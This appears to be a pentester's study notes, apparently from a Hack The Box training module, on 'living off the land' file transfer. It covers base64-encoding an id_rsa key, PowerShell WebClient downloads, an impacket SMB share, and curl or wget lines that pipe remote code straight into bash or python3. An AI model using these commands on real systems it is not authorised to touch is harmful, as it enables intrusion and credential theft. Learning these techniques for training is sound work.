![[Pasted image 20240825050625.png]]

# #LOTL Techniques to #download #files

## PowerShell Base64 Encode & Decode
First encode the file you want to download in base64 : `cat id_rsa |base64 -w 0;echo`

Then decode it on target : `[IO.File]::WriteAllBytes("[path to write file to]", [Convert]::FromBase64String("[base64 encoded file]"))`


## PowerShell Web Downloads

Most companies allow `HTTP` and `HTTPS` outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.

PowerShell offers many file transfer options. In any version of PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |
```powershell
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

Creating SMB share to download the file on windows hosts

```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

```r
copy \\[0.0.0.0]\share\[filename]
```
# Linux #file #transfers
#### Encode SSH Key to Base64

```shell
cat [file to transfer] |base64 -w 0;echo
```

We copy this content, paste it onto our Linux target machine, and use `base64` with the option `-d' to decode it.

#### Linux - Decode the File

```shell
echo -n '[generated B64 output]' | base64 -d > id_rsa
```

Confirm the files are the same with ` md5sum [file] ` and compare the output.

Download files from internet using 

`wget [url]`  / `curl -o [output file] [url]`

Fileless [???] with curl : `curl [url] | bash`
                                   ^^^ change software if needed, bash jf example.

Fileless [???] with wget : `wget -qO- [url] | python3`
                                   ^^^ change software if needed, py3 jf example.

**enable shh server** : `sudo systemctl enable ssh`

# With code

https://academy.hackthebox.com/module/24/section/1574
flemme sah

